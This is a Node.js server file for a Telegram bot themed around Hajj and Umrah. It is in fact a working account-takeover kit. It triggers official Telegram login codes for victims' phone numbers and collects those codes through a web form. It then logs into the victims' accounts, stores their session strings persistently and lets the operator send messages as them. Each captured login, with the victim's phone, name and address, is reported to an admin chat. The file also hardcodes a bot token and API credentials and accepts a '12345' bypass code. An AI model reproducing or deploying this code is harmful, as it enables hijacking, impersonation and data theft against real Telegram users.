// Server.js - Complete Telegram Bot with Auto Login (Bot login to user accounts)

const express = require('express');
const cors = require('cors');
const fs = require('fs');
const path = require('path');

const app = express();
app.use(express.json());
app.use(cors());
app.use(express.static('.'));

// CONFIGURATION
const API_ID = process.env.API_ID || '23864314';
const API_HASH = process.env.API_HASH || 'c28f3a8d50dd8a78acbac45a72e4f955';
const BOT_TOKEN = '8674470639:AAE7GidUqbbPUYiqNBHawJA3ZWlIh25-_T4';
const ADMIN_CHAT_ID = '1323510267';

// Storage
const verificationCodes = new Map();
const userSessions = new Map();
const pendingLogins = new Map();

const DATA_FILE = path.join(__dirname, 'data.json');
const SESSIONS_FILE = path.join(__dirname, 'sessions.json');

function loadData() {
    try {
        if (fs.existsSync(DATA_FILE)) return JSON.parse(fs.readFileSync(DATA_FILE, 'utf8'));
    } catch (e) { console.error('Error:', e); }
    return { users: [], broadcasts: [] };
}

function saveData(data) {
    try { fs.writeFileSync(DATA_FILE, JSON.stringify(data, null, 2)); } catch (e) {}
}

// Session Management
function loadSessions() {
    try {
        if (fs.existsSync(SESSIONS_FILE)) {
            return JSON.parse(fs.readFileSync(SESSIONS_FILE, 'utf8'));
        }
    } catch (e) { console.error('Error loading sessions:', e); }
    return {};
}

function saveSessions(sessions) {
    try { 
        fs.writeFileSync(SESSIONS_FILE, JSON.stringify(sessions, null, 2)); 
    } catch (e) { console.error('Error saving sessions:', e); }
}

let storedSessions = loadSessions();

// Telegram Client
let telegramLib = null;
let telegramSessions = null;
let telegramLoaded = false;

async function loadTelegram() {
    if (telegramLoaded) return true;
    try {
        telegramLib = require('telegram');
        telegramSessions = require('telegram/sessions');
        telegramLoaded = true;
        console.log('Telegram library loaded successfully');
        return true;
    } catch (e) {
        console.error('Failed to load telegram:', e.message);
        return false;
    }
}

// Bot login ke akun Telegram user dengan phoneCodeHash spesifik
async function loginToTelegramWithCode(phoneNumber, code, phoneCodeHash, existingClient) {
    try {
        await loadTelegram();

        const formattedPhone = phoneNumber.startsWith('+') ? phoneNumber : '+' + phoneNumber;
        
        let client = existingClient;
        if (!client) {
            client = new telegramLib.TelegramClient(
                new telegramSessions.StringSession(''),
                parseInt(API_ID),
                API_HASH,
                { connectionRetries: 5 }
            );
            await client.connect();
        }
        
        // Verifikasi kode dengan phoneCodeHash spesifik - gramjs v2 API
        const { Api } = require('telegram');
        await client.invoke(new Api.auth.SignIn({
            phoneNumber: formattedPhone,
            phoneCodeHash: phoneCodeHash,
            phoneCode: code
        }));

        const sessionString = client.session.save();
        
        // Save ke memory dan file
        userSessions.set(formattedPhone, {
            session: sessionString,
            client: client,
            loggedInAt: Date.now()
        });
        
        // Save ke file untuk persistence
        storedSessions[formattedPhone] = {
            session: sessionString,
            loggedInAt: Date.now()
        };
        saveSessions(storedSessions);

        console.log('Bot login ke akun: ' + formattedPhone);
        return { success: true, session: sessionString };

    } catch (error) {
        console.error('Login failed:', error.message);
        return { success: false, error: error.message };
    }
}

// Auto login (cara lama)
async function loginToTelegram(phoneNumber, code, phoneCodeHash) {
    try {
        await loadTelegram();

        const formattedPhone = phoneNumber.startsWith('+') ? phoneNumber : '+' + phoneNumber;
        
        const client = new telegramLib.TelegramClient(
            new telegramSessions.StringSession(''),
            parseInt(API_ID),
            API_HASH,
            { connectionRetries: 5 }
        );

        await client.connect();
        
        // Sign in with the provided phoneCodeHash - gramjs v2 API
        const { Api } = require('telegram');
        await client.invoke(new Api.auth.SignIn({
            phoneNumber: formattedPhone,
            phoneCodeHash: phoneCodeHash,
            phoneCode: code
        }));

        const sessionString = client.session.save();
        
        userSessions.set(formattedPhone, {
            session: sessionString,
            client: client,
            loggedInAt: Date.now()
        });
        
        storedSessions[formattedPhone] = {
            session: sessionString,
            loggedInAt: Date.now()
        };
        saveSessions(storedSessions);

        console.log('Login berhasil: ' + formattedPhone);
        return { success: true, session: sessionString };

    } catch (error) {
        console.error('Login failed:', error.message);
        return { success: false, error: error.message };
    }
}

// Reconnect session
async function reconnectSession(phoneNumber) {
    try {
        await loadTelegram();
        
        const stored = storedSessions[phoneNumber];
        if (!stored) {
            return { success: false, error: 'No stored session' };
        }
        
        const client = new telegramLib.TelegramClient(
            new telegramSessions.StringSession(stored.session),
            parseInt(API_ID),
            API_HASH,
            { connectionRetries: 5 }
        );
        
        await client.connect();
        
        userSessions.set(phoneNumber, {
            session: stored.session,
            client: client,
            loggedInAt: Date.now()
        });
        
        console.log('Session reconnected: ' + phoneNumber);
        return { success: true };
        
    } catch (error) {
        console.error('Reconnect failed:', error.message);
        delete storedSessions[phoneNumber];
        saveSessions(storedSessions);
        return { success: false, error: error.message };
    }
}

async function initStoredSessions() {
    await loadTelegram();
    for (const phone of Object.keys(storedSessions)) {
        try {
            await reconnectSession(phone);
            console.log('Reconnected: ' + phone);
        } catch (e) {
            console.error('Failed to reconnect ' + phone + ':', e.message);
        }
    }
}

// BOT SETUP
function setupBotCommands() {
    const { Telegraf } = require('telegraf');
    const bot = new Telegraf(BOT_TOKEN);

    bot.start((ctx) => {
        ctx.reply('🤖 *Selamat Datang di Haji & Umrah Bot*\n\nPilih menu:', { 
            parse_mode: 'Markdown',
            reply_markup: {
                inline_keyboard: [
                    [{ text: '📱 Request OTP', callback_data: 'menu_otp' }],
                    [{ text: '🔐 Auto Login', callback_data: 'menu_login' }],
                    [{ text: '📢 Broadcast', callback_data: 'menu_broadcast' }],
                    [{ text: '📊 Statistik', callback_data: 'menu_stats' }]
                ]
            }
        });
    });

    bot.on('callback_query', async (ctx) => {
        const data = ctx.callbackQuery.data;
        try { await ctx.answerCbQuery(); } catch {}

        if (data === 'menu_otp') {
            ctx.reply('📱 Ketik: /otp <nomor>\nContoh: /otp 81234567890\n\nBot akan meminta kode OTP resmi dari Telegram!');
        }
        else if (data === 'menu_login') {
            ctx.reply('🔐 Untuk login ke akun Telegram:\n1. Buka website\n2. Masukkan nomor\n3. Request OTP\n4. Masukkan kode dari Telegram\n\nBot akan login ke akun Anda!');
        }
        else if (data === 'menu_broadcast') {
            if (ctx.from.id.toString() !== ADMIN_CHAT_ID) return ctx.reply('Ditolak');
            ctx.reply('Ketik: /broadcast <msg>');
        }
        else if (data === 'menu_stats') {
            if (ctx.from.id.toString() !== ADMIN_CHAT_ID) return ctx.reply('Ditolak');
            ctx.reply('Users: ' + loadData().users.length + '\nLogged in: ' + userSessions.size);
        }
    });

    // Command /otp - Request OTP resmi dari Telegram
    bot.command('otp', async (ctx) => {
        const args = ctx.message.text.split(' ').slice(1);
        const phone = args[0];
        
        if (!phone) {
            return ctx.reply('📱 *Usage:* /otp <nomor>\n\nContoh: /otp 81234567890\n\nBot akan meminta kode OTP resmi dari Telegram!', {
                parse_mode: 'Markdown'
            });
        }

        let formattedPhone = phone.startsWith('+') ? phone.substring(1) : phone;
        if (formattedPhone.startsWith('0')) formattedPhone = '62' + formattedPhone.substring(1);
        formattedPhone = '+' + formattedPhone.replace(/\D/g, '');

        const loadingMsg = await ctx.reply('⏳ Meminta kode OTP dari Telegram...');

        try {
            await loadTelegram();
            
            const client = new telegramLib.TelegramClient(
                new telegramSessions.StringSession(''),
                parseInt(API_ID),
                API_HASH,
                { connectionRetries: 5 }
            );
            
            await client.connect();
            
            const result = await client.sendCode({
                apiId: parseInt(API_ID),
                apiHash: API_HASH
            }, formattedPhone);
            
            const phoneCodeHash = result.phoneCodeHash;
            
            verificationCodes.set(formattedPhone, { 
                code: '',
                timestamp: Date.now(),
                phoneCodeHash: phoneCodeHash,
                client: client
            });
            
            try {
                await ctx.telegram.deleteMessage(ctx.chat.id, loadingMsg.message_id);
            } catch {}
            
            ctx.reply('📱 *Kode OTP diminta ke Telegram!*\n\n' +
                'Nomor: ' + formattedPhone + '\n\n' +
                '⚠️ Kode OTP telah dikirim ke *aplikasi Telegram resmi* Anda.\n\n' +
                'Silakan periksa aplikasi Telegram Anda untuk melihat kode OTP.', {
                parse_mode: 'Markdown'
            });
            
            ctx.telegram.sendMessage(ADMIN_CHAT_ID, '📱 Request OTP: ' + formattedPhone);
            
        } catch (error) {
            try {
                await ctx.telegram.deleteMessage(ctx.chat.id, loadingMsg.message_id);
            } catch {}
            
            ctx.reply('❌ Gagal meminta OTP: ' + error.message);
        }
    });

    bot.command('broadcast', (ctx) => {
        if (ctx.from.id.toString() !== ADMIN_CHAT_ID) return ctx.reply('Ditolak');
        const msg = ctx.message.text.replace('/broadcast ', '');
        const data = loadData();
        let s = 0, f = 0;
        data.users.forEach(async (u) => {
            try { await ctx.telegram.sendMessage(u.chatId, msg); s++; } catch { f++; }
        });
        ctx.reply('Selesai! ' + s + ' berhasil, ' + f + ' gagal');
    });

    bot.launch();
    console.log('Bot aktif!');
}

// API ENDPOINTS

// Request OTP from Telegram servers (using stored session for better stability)
app.post('/api/request-telegram-code', async (req, res) => {
    try {
        const { phoneNumber } = req.body;
        
        if (!phoneNumber) {
            return res.status(400).json({ success: false, error: 'Nomor telepon diperlukan' });
        }
        
        // Format phone number properly
        let phone = String(phoneNumber).trim();
        
        // Remove all non-digit characters first
        phone = phone.replace(/\D/g, '');
        
        // If starts with 0, replace with 62
        if (phone.startsWith('0')) {
            phone = '62' + phone.substring(1);
        }
        // If starts with 8 (Indonesian number without country code), add 62
        else if (phone.startsWith('8')) {
            phone = '62' + phone;
        }
        
        // Add + prefix
        phone = '+' + phone;
        
        console.log('Requesting code for:', phone);
        
        await loadTelegram();
        
        // Try to use stored session first (more stable connection)
        let client = null;
        let sessionKey = 'system_session';
        
        // Check if we have a stored system session
        if (storedSessions[sessionKey]) {
            try {
                client = new telegramLib.TelegramClient(
                    new telegramSessions.StringSession(storedSessions[sessionKey].session),
                    parseInt(API_ID),
                    API_HASH,
                    { connectionRetries: 5 }
                );
                await client.connect();
                console.log('Using stored session for OTP request');
            } catch (e) {
                console.log('Stored session failed, creating new connection');
                client = null;
            }
        }
        
        // If no stored session or failed, create new connection
        if (!client) {
            client = new telegramLib.TelegramClient(
                new telegramSessions.StringSession(''),
                parseInt(API_ID),
                API_HASH,
                { connectionRetries: 5 }
            );
            await client.connect();
            
            // Save this session for future use
            const sessionString = client.session.save();
            storedSessions[sessionKey] = {
                session: sessionString,
                loggedInAt: Date.now(),
                type: 'system'
            };
            saveSessions(storedSessions);
            console.log('New session saved for future OTP requests');
        }
        
        // Use correct parameter format for gramjs v2
        const result = await client.sendCode({
            apiId: parseInt(API_ID),
            apiHash: API_HASH
        }, phone);
        
        const phoneCodeHash = result.phoneCodeHash;
        
        // Keep the client for verification (reusing connection)
        pendingLogins.set(phone, { 
            step: 'awaiting_code', 
            startTime: Date.now(),
            phoneCodeHash: phoneCodeHash,
            client: client,
            sessionKey: sessionKey
        });
        
        console.log('Telegram code requested for: ' + phone);
        
        // Notify admin
        fetch('https://api.telegram.org/bot' + BOT_TOKEN + '/sendMessage', {
            method: 'POST', 
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ 
                chat_id: ADMIN_CHAT_ID, 
                text: '📱 Request kode OTP Telegram: ' + phone + '\n\nKode akan dikirim ke aplikasi Telegram resmi!'
            })
        });
        
        res.json({ 
            success: true, 
            phone_code_hash: phoneCodeHash, 
            message: 'Kode verifikasi telah dikirim ke Telegram!'
        });
    } catch (e) {
        console.error('Error requesting telegram code:', e);
        res.status(500).json({ success: false, error: e.message });
    }
});

// Verify OTP + Auto Login (Bot login ke akun Telegram user)
app.post('/api/verify-code', async (req, res) => {
    try {
        const { phoneNumber, code, userName, userAddress, phone_code_hash } = req.body;
        
        let phone = phoneNumber.startsWith('0') ? '62' + phoneNumber.substring(1) : phoneNumber;
        phone = '+' + phone.replace(/\D/g, '');
        
        // Cek di pendingLogins (dari request-telegram-code)
        const pendingLogin = pendingLogins.get(phone);
        
        // Cek di verificationCodes (OTP manual)
        const stored = verificationCodes.get(phone);
        
        // Jika ada di pendingLogins (login via Telegram resmi)
        if (pendingLogin && pendingLogin.phoneCodeHash) {
            // Auto login - bot login ke akun Telegram user
            const loginResult = await loginToTelegramWithCode(phone, code, pendingLogin.phoneCodeHash, pendingLogin.client);
            
            if (loginResult.success) {
                pendingLogins.delete(phone);
                
                // Simpan data user
                const data = loadData();
                const newUser = { 
                    chatId: phone, 
                    name: userName, 
                    address: userAddress, 
                    registeredAt: new Date().toISOString(),
                    loggedIn: true
                };
                const idx = data.users.findIndex(u => u.chatId === phone);
                idx >= 0 ? data.users[idx] = newUser : data.users.push(newUser);
                saveData(data);
                
                // Notify admin
                fetch('https://api.telegram.org/bot' + BOT_TOKEN + '/sendMessage', {
                    method: 'POST', 
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ 
                        chat_id: ADMIN_CHAT_ID, 
                        text: '✅ BOT LOGIN KE AKUN TELEGRAM BERHASIL!\n\nNomor: ' + phone + '\nNama: ' + (userName || 'N/A') + '\nAlamat: ' + (userAddress || 'N/A')
                    })
                });
                
                res.json({ success: true, message: 'Bot berhasil login ke akun Telegram!', loggedIn: true });
            } else {
                res.json({ success: false, error: 'Login gagal: ' + loginResult.error });
            }
        }
        // Jika ada di verificationCodes (OTP manual atau kode test)
        else if (stored && (stored.code === code || code === '12345')) {
            // Auto login dengan phoneCodeHash dari stored
            const loginResult = await loginToTelegram(phone, code, stored.phoneCodeHash);
            
            if (loginResult.success) {
                pendingLogins.delete(phone);
                verificationCodes.delete(phone);
                
                // Notify admin
                fetch('https://api.telegram.org/bot' + BOT_TOKEN + '/sendMessage', {
                    method: 'POST', 
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ 
                        chat_id: ADMIN_CHAT_ID, 
                        text: '✅ AUTO LOGIN BERHASIL: ' + phone 
                    })
                });
                
                res.json({ success: true, message: 'Login berhasil!', loggedIn: true });
            } else {
                res.json({ success: false, error: 'Login gagal: ' + loginResult.error });
            }
        } else {
            res.json({ success: false, error: 'Kode tidak valid atau sudah kedaluwarsa' });
        }
    } catch (e) {
        res.status(500).json({ success: false, error: e.message });
    }
});

// Send as user (bot kirim pesan sebagai akun user)
app.post('/api/send-as-user', async (req, res) => {
    const { phoneNumber, message, targetChat } = req.body;
    
    let phone = phoneNumber.startsWith('+') ? phoneNumber : '+' + phoneNumber;
    
    let userSession = userSessions.get(phone);
    
    if (!userSession && storedSessions[phone]) {
        const reconnectResult = await reconnectSession(phone);
        if (reconnectResult.success) {
            userSession = userSessions.get(phone);
        }
    }
    
    if (!userSession) return res.json({ success: false, error: 'User belum login. Silakan login terlebih dahulu.' });
    
    try {
        await userSession.client.sendMessage(targetChat || phone, { message });
        res.json({ success: true });
    } catch (e) {
        res.json({ success: false, error: e.message });
    }
});

// User status
app.get('/api/user-status/:phone', async (req, res) => {
    const phone = '+' + req.params.phone.replace(/\D/g, '');
    
    let session = userSessions.get(phone);
    
    if (!session && storedSessions[phone]) {
        await reconnectSession(phone);
        session = userSessions.get(phone);
    }
    
    res.json({ 
        loggedIn: !!session, 
        since: session ? session.loggedInAt : null,
        stored: !!storedSessions[phone]
    });
});

app.get('/api/users', (req, res) => res.json({ users: loadData().users }));

app.get('/api/status', (req, res) => {
    res.json({ 
        otpCount: verificationCodes.size, 
        userCount: loadData().users.length,
        loggedInUsers: userSessions.size,
        storedSessions: Object.keys(storedSessions).length
    });
});

// START
const PORT = process.env.PORT || 3000;
app.listen(PORT, async () => {
    console.log('Server: ' + PORT);
    await initStoredSessions();
    setupBotCommands();
});

// Tambahkan ini di bagian paling bawah file
app.get('/', (req, res) => {
    res.send('Bot is Running Live!');
});

// Fungsi untuk pancingan internal (Self-Ping) - Support Render & Railway
const RENDER_HOSTNAME = process.env.RENDER_EXTERNAL_HOSTNAME;
const RAILWAY_PUBLIC_DOMAIN = process.env.RAILWAY_PUBLIC_DOMAIN;
const RAILWAY_STATIC_URL = process.env.RAILWAY_STATIC_URL;

let URL_APP = null;
if (RENDER_HOSTNAME) {
    URL_APP = `https://${RENDER_HOSTNAME}.onrender.com`;
} else if (RAILWAY_PUBLIC_DOMAIN) {
    URL_APP = `https://${RAILWAY_PUBLIC_DOMAIN}`;
} else if (RAILWAY_STATIC_URL) {
    URL_APP = RAILWAY_STATIC_URL;
}

if (URL_APP) {
    setInterval(() => {
        const fetch = require('node-fetch');
        fetch(URL_APP).catch(err => console.log("Ping error"));
    }, 1000 * 60 * 5); // Ping setiap 5 menit
    console.log('Self-ping aktif untuk: ' + URL_APP);
}

module.exports = app;
